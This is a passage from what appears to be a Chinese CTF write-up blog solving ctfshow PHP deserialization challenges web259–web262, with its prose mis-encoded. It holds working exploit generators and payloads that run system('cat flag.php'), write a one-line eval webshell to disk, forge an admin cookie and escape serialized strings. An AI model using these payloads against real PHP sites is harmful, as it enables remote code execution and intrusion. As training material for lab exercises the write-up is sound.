class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());</span><br><span class="language-php"><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:&#x27;</span>,<span class="hljs-string">&#x27;O:+&#x27;</span>,<span class="hljs-variable">$a</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>Cookie:user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">23</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>cat+flag.php<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>])))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…,ç›´æ¥è¾“å‡ºflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;ctfshow_i_love_36D&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><br></code></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;password!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-variable language_">$this</span>-&gt;username.<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]); <br></code></pre></td></tr></table></figure><p>å½“code&#x3D;&#x3D;0x36d(877)ï¼Œå°±å¯ä»¥å†™å…¥æ–‡ä»¶</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            file_put_contents($<span class="hljs-keyword">this</span>-&gt;username, $<span class="hljs-keyword">this</span>-&gt;password);<br>        &#125; <br></code></pre></td></tr></table></figure><p>codeçš„å€¼åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼ å…¥ï¼Œæ‰€ä»¥usernameåº”è¯¥ä¸º877+éæ•°å­—ï¼Œè¿™æ ·å°±æ»¡è¶³<code>$this-&gt;code==0x36d</code>æ¡ä»¶äº†,å¼±æ¯”è¾ƒ877&#x3D;&#x3D;877.phpä¸ºçœŸï¼Œusernameå¯ä»¥å†™æˆphpï¼Œå’Œpassowrdå†™æˆä¸€å¥è¯æœ¨é©¬,</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __unserialize($<span class="hljs-keyword">data</span>)&#123;<br>        $<span class="hljs-keyword">this</span>-&gt;username=$<span class="hljs-keyword">data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        $<span class="hljs-keyword">this</span>-&gt;password=$<span class="hljs-keyword">data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        $<span class="hljs-keyword">this</span>-&gt;code = $<span class="hljs-keyword">this</span>-&gt;username.$<span class="hljs-keyword">this</span>-&gt;password;<br>    &#125; <br></code></pre></td></tr></table></figure><p>PHP7.4.0+ç‰ˆæœ¬ï¼Œå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº†_unserialize()å’Œ_wakeup()ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰_unserialize()æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ_wakeup()æ–¹æ³•ä¼šå¿½ç•¥</p><p>æ„é€ usernameå’Œpasswordçš„å€¼æŠŠshellå†™å…¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&#x27;877.php&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowvip</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+<span class="hljs-keyword">eval</span>%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D<br></code></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥877.phpä¸­ï¼ŒPOST 1&#x3D;system(â€˜cat &#x2F;f*â€™);</p><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>æœ¬é¢˜æœ‰ä¸¤ç§è§£æ³•ï¼Œç›´æ¥æ„é€ ç±»å’Œå­—ç¬¦é€ƒé€¸<br>è§£æ³•ä¸€ï¼š<br>æ³¨é‡Šä¸­æœ‰ä¸€ä¸ª.phpæ–‡ä»¶ï¼Œç›´æ¥è¿›å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ä¸‹é¢çš„ifçš„æ„æ€æ˜¯åœ¨cookieä¸­ç»™msgä¼ å…¥messageåºåˆ—åŒ–åè¿›è¡Œbase64ç¼–ç çš„å€¼ï¼Œtokenå€¼æ˜¯å¯ä»¥æ”¹å˜çš„ï¼ŒæŠŠtokenå˜ä¸ºadmin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie:mag=Tz<span class="hljs-meta">o3</span>OiJtZX<span class="hljs-symbol">NzYWdlIjo0</span>O<span class="hljs-symbol">ntzOjQ6</span>ImZyb<span class="hljs-number">20</span>i<span class="hljs-meta">O047</span>czozOiJtc<span class="hljs-number">2</span>ci<span class="hljs-meta">O047</span>czoyOiJ<span class="hljs-number">0</span>byI<span class="hljs-number">7</span>TjtzOjU<span class="hljs-number">6</span>I<span class="hljs-symbol">nRva2</span>VuIjtzOjU<span class="hljs-number">6</span>ImFkbWluIjt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼šå­—ç¬¦é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuck&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$umsg</span>;<br><br></code></pre></td></tr></table></figure><p>å¯¹æ¯”å­—ç¬¦å‰ååºåˆ—åŒ–å­—ç¬¦çš„é•¿åº¦çš„å€¼ï¼Œè¿‡æ»¤å$toçš„é•¿åº¦æ˜¯4ï¼Œä½†é‡Œé¢æœ‰5ä¸ªå­—ç¬¦ï¼Œè¿™æ—¶å€™è¿›è¡Œååºåˆ—åŒ–ï¼Œå®é™…ä¸Šä¹Ÿåªä¼šæˆªå–4ä¸ªå­—ç¬¦ï¼ŒåŸæœ¬Uåé¢çš„å¼•å·å‰ç§»ä¸€ä½ï¼Œè¿™æ—¶å€™å°±ä¼šé€ƒé€¸å‡ºä¸€ä¸ªå­—ç¬¦Uï¼Œå¾ˆæ˜¾ç„¶çŸ­å˜æˆé•¿ï¼Œæ¯æ¬¡è½¬æ¢å¤šä¸€ä¸ªå­—ç¬¦ä»fuckå˜ä¸ºloveUï¼Œå°±ä¼šå¤šé€ƒé€¸ä¸€ä¸ªå­—ç¬¦<code>s:4:&quot;love&quot;U;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">å‰:<br>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>å:<br>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;loveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©tokenåªå˜æˆadminçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è®©å®ƒé€ƒé€¸å‡ºæ¥ï¼Œæˆ‘ä»¬å…ˆåœ¨$toä¼ å…¥<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>,fuckåè¦è·Ÿå¼•å·ï¼ŒåŸç†å’Œsqlæ³¨å…¥ä¸€æ ·ï¼Œç”¨åŒå¼•å·æŠŠ$toé—­åˆäº†ï¼Œæœ€åç”¨}æŠŠååºåˆ—åŒ–ç»™é—­åˆäº†ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¿½ç•¥åé¢çš„å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span 